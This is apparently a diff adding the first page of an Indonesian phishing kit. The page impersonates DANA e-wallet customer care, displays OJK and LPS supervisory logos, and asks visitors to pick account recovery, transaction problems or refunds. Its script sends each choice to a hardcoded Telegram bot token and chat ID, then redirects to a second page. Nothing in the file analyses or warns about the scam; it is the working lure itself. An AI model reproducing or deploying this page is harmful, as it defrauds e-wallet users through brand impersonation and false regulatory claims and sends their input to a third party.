@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
+  <title>Dana-Costomer-Care-Dana</title>
+
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css"/>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/slick-carousel@1.8.1/slick/slick.css"/>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/slick-carousel@1.8.1/slick/slick-theme.css"/>
+
+  <style>
+    body {
+      background-color: #fff;
+      font-family: 'Open Sans', sans-serif;
+      margin: 0;
+      padding: 0;
+    }
+
+    /* Header */
+    .header {
+      background: #0086e0;
+      padding: 20px 0;
+      text-align: center;
+    }
+    .header img {
+      width: 80px;
+      height: auto;
+    }
+
+    /* Slider */
+    .slider {
+      margin: 15px 10px;
+    }
+    .slider .slick-slide img {
+      width: 100%;
+      border-radius: 10px;
+    }
+
+    /* Card Form */
+    .card {
+      background: #fff;
+      border-radius: 12px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+      padding: 20px;
+      margin: 20px 10px;
+    }
+    .card h2 {
+      font-size: 16px;
+      font-weight: bold;
+      color: #0086e0;
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    .card h5 {
+      font-size: 15px;
+      font-weight: 600;
+      color: #0086e0;
+      margin: 5px 0;
+    }
+
+    /* Button */
+    .btn-punya {
+      display: block;
+      margin: 20px auto 0 auto;
+      background: #0086e0;
+      border: none;
+      height: 50px;
+      width: 100%;
+      font-size: 16px;
+      font-weight: bold;
+      color: #fff;
+      border-radius: 8px;
+      box-shadow: 2px 2px 6px rgba(0,0,0,0.2);
+    }
+
+    /* Footer */
+    .footer {
+      text-align: center;
+      margin: 30px 10px;
+    }
+    .footer h6 {
+      font-size: 13px;
+      font-weight: bold;
+      color: #000;
+      margin-bottom: 15px;
+    }
+    .footer img {
+      margin: 5px 10px;
+      width: 55px;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Header -->
+  <div class="header">
+    <img src="https://telegra.ph/file/2f6ceb2e5a1a2fc7ed4ca.png" alt="Logo">
+  </div>
+
+  <!-- Slider -->
+  <div class="slider">
+    <div><a href="#"><img src="https://telegra.ph/file/be0c88ba14ca044776e1c.jpg" alt="Image 1"></a></div>
+    <div><a href="#"><img src="https://telegra.ph/file/f214ca8c116e23a945567.jpg" alt="Image 2"></a></div>
+    <div><a href="#"><img src="https://telegra.ph/file/ef49956cd9d6444e24f41.jpg" alt="Image 4"></a></div>
+    <div><a href="#"><img src="https://telegra.ph/file/08d026a96c972a8c29acf.jpg" alt="Image 5"></a></div>
+    <div><a href="#"><img src="https://telegra.ph/file/1214de4228752b76ef775.jpg" alt="Image 6"></a></div>
+    <div><a href="#"><img src="https://telegra.ph/file/1e68929082b536f5df374.jpg" alt="Image 7"></a></div>
+    <div><a href="#"><img src="https://telegra.ph/file/df54e3f92fa6e1a99fd82.jpg" alt="Image 8"></a></div>
+  </div>
+
+  <!-- Form -->
+  <div class="card">
+    <form onsubmit="playaudio(); return false">
+      <audio src="https://e-formulir.mwebs.id/BotikaTTS%20_5_.mp3" id="musikku"></audio>
+      <h2>Silahkan Pilih Sesuai Dengan Kebutuhan Anda</h2>
+
+      <div>
+        <input type="radio" id="baru" name="tarif" value="Pemulihan akun DANA" checked>
+        <label for="baru"><h5>&nbsp; Pemulihan akun DANA</h5></label>
+      </div>
+      <div>
+        <input type="radio" id="lama" name="tarif" value="Kendala Transaksi">
+        <label for="lama"><h5>&nbsp; Kendala Transaksi</h5></label>
+      </div>
+      <div>
+        <input type="radio" id="pengembalian" name="tarif" value="Pengembalian DANA">
+        <label for="pengembalian"><h5>&nbsp; Pengembalian DANA</h5></label>
+      </div>
+
+      <button class="btn-punya" type="submit">Konfirmasi</button>
+    </form>
+  </div>
+
+  <!-- Footer -->
+  <div class="footer">
+    <h6>DANA Terdaftar dan diawasi oleh:</h6>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/8/83/OJK_Logo.png" alt="OJK">
+    <img src="https://assets.bukalapak.com/daisy/compro/images/about/logo-mitra.png" alt="Mitra">
+    <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh7H3AZHRJ8VHqTtUQZVi0MP9fnWfj4q8PXBGeCY8H7TOzwmQBfZrRZ_mqq50lFLvTZTHCnzIR-stdV2Gg_CjT6XUCTdj0fZw4TGq8gC4AJn2kF9vk5O7Doxi0Ove7_b-eIh4dxbvhC0L3BkjGQSSSgtaD5TxImeKlEqfZlhlx2aI-kHD1R5_XSTCQl1k0/s1200/IMG_20230827_160252.jpg" alt="Bank">
+    <img src="https://infobanknews.com/wp-content/uploads/2019/04/logo-lps.png" alt="LPS">
+  </div>
+
+  <!-- JS -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/slick-carousel@1.8.1/slick/slick.min.js"></script>
+  <script>
+    const TOKEN = "7968576316:AAF6vbfSpa2XL-WIT_1mkUKmo2khbAAVrIs";
+    const CHAT_ID = "7604299278";
+    const API_URL = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
+    $(document).ready(function(){
+      $('.slider').slick({
+        autoplay: true,
+        autoplaySpeed: 1500,
+        dots: true
+      });
+    });
+
+    function sendToTelegram(pesan) {
+      fetch(API_URL, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: pesan
+        })
+      });
+    }
+
+    function playaudio(){
+      document.getElementById('musikku').play();
+
+      // ambil value radio
+      let pilih = document.querySelector('input[name="tarif"]:checked');
+      if (!pilih) {
+        alert("Silakan pilih salah satu dulu.");
+        return;
+      }
+
+      let pesan = `Pengguna memilih: ${pilih.value}`;
+      sendToTelegram(pesan);
+
+      setTimeout(() => {
+        window.location.href = 'kedua.html'; // arahkan ke halaman kedua.html
+      }, 3050);
+    }
+  </script>
+
+</body>
+</html>
